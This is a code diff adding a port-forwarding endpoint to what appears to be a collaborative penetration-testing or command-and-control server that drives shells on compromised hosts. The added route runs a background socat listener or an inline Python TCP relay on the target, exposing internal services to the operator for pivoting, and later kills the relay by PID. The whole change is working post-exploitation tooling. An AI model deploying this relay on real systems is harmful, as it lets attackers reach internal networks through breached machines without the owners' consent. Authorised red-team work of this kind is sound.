@@ -400,6 +400,106 @@ def register_sessions_routes(app: FastAPI, ctx) -> None:
         broker.publish({"type": "add", "what": "credential", "by": x_tester})
         return {"ok": True, "added": added}
 
+    # --- port forwarding through the shell ----------------------------------------
+    # In-memory tracking of active forwards per session (not persisted — a forward dies
+    # with the shell). Each entry: {id, lport, rhost, rport, pid, method}.
+    _portfwds: dict[str, list[dict]] = {}
+
+    @app.post("/api/sessions/{session_id}/portfwd")
+    async def portfwd(session_id: str, body: dict = Body(...)):
+        """Start or stop a TCP port forward on the target through the shell.
+
+        Start: runs a background socat (preferred) or Python TCP relay on the target,
+        making remote_host:remote_port accessible on the target at 0.0.0.0:listen_port.
+        The operator then reaches it via target_ip:listen_port.
+
+        This is the simplest useful forward — it makes internal services reachable from
+        the operator's box through the compromised host, with zero extra tooling."""
+        sess = mgr.get(session_id)
+        if sess is None:
+            raise HTTPException(404, "no such session")
+        if not sess.connected:
+            raise HTTPException(409, "shell not connected")
+
+        action = str(body.get("action", "start"))
+
+        if action == "list":
+            return {"forwards": _portfwds.get(session_id, [])}
+
+        if action == "stop":
+            fwd_id = str(body.get("id", ""))
+            fwds = _portfwds.get(session_id, [])
+            fwd = next((f for f in fwds if f["id"] == fwd_id), None)
+            if not fwd:
+                raise HTTPException(404, "no such forward")
+            await sess.send(f"kill {fwd['pid']} 2>/dev/null; kill -9 {fwd['pid']} 2>/dev/null\n".encode())
+            _portfwds[session_id] = [f for f in fwds if f["id"] != fwd_id]
+            broker.publish({"type": "session", "event": "portfwd_stop", "id": sess.id})
+            return {"ok": True}
+
+        # action == "start"
+        lport = int(body.get("listen_port", 0))
+        rhost = str(body.get("remote_host", "127.0.0.1")).strip()
+        rport = int(body.get("remote_port", 0))
+        if not (1 <= lport <= 65535) or not (1 <= rport <= 65535) or not rhost:
+            raise HTTPException(400, "listen_port, remote_host, remote_port required (1-65535)")
+
+        import uuid
+        fwd_id = uuid.uuid4().hex[:8]
+        marker = f"rcfwd_{fwd_id}"
+
+        # try socat first, fall back to Python
+        socat_cmd = (
+            f"socat TCP-LISTEN:{lport},fork,reuseaddr TCP:{rhost}:{rport} &"
+            f" RCPID=$!; echo {marker}_PID_$RCPID"
+        )
+        py_cmd = (
+            f"python3 -c '"
+            f"import socket,threading,os,sys;"
+            f"s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);"
+            f"s.bind((\"0.0.0.0\",{lport}));s.listen(8);"
+            f"def b(a,c):\n"
+            f" try:\n"
+            f"  while 1:\n"
+            f"   d=a.recv(4096)\n"
+            f"   if not d:break\n"
+            f"   c.sendall(d)\n"
+            f" except:pass\n"
+            f" a.close();c.close()\n"
+            f"while 1:\n"
+            f" c,_=s.accept()\n"
+            f" try:r=socket.create_connection((\"{rhost}\",{rport}))\n"
+            f" except:c.close();continue\n"
+            f" threading.Thread(target=b,args=(c,r),daemon=1).start()\n"
+            f" threading.Thread(target=b,args=(r,c),daemon=1).start()\n"
+            f"' &"
+            f" RCPID=$!; echo {marker}_PID_$RCPID"
+        )
+
+        # detect socat availability
+        check = await sess.run_and_capture(b"command -v socat >/dev/null 2>&1 && echo SOCAT_OK || echo SOCAT_NO", timeout=5.0)
+        has_socat = b"SOCAT_OK" in check
+
+        cmd = socat_cmd if has_socat else py_cmd
+        method = "socat" if has_socat else "python"
+
+        out = await sess.run_and_capture(cmd.encode(), timeout=8.0)
+        # extract PID from marker
+        pid = ""
+        for line in out.decode("ascii", "replace").split("\n"):
+            if f"{marker}_PID_" in line:
+                pid = line.split(f"{marker}_PID_")[1].strip()
+                break
+
+        if not pid:
+            return {"ok": False, "reason": f"could not start {method} forwarder (port {lport} may be in use)"}
+
+        fwd_entry = {"id": fwd_id, "lport": lport, "rhost": rhost, "rport": rport,
+                     "pid": pid, "method": method}
+        _portfwds.setdefault(session_id, []).append(fwd_entry)
+        broker.publish({"type": "session", "event": "portfwd_start", "id": sess.id})
+        return {"ok": True, **fwd_entry}
+
     # --- the collaborative terminal (WebSocket) ---------------------------------
     @app.websocket("/api/sessions/{session_id}/attach")
     async def attach(ws: WebSocket, session_id: str):
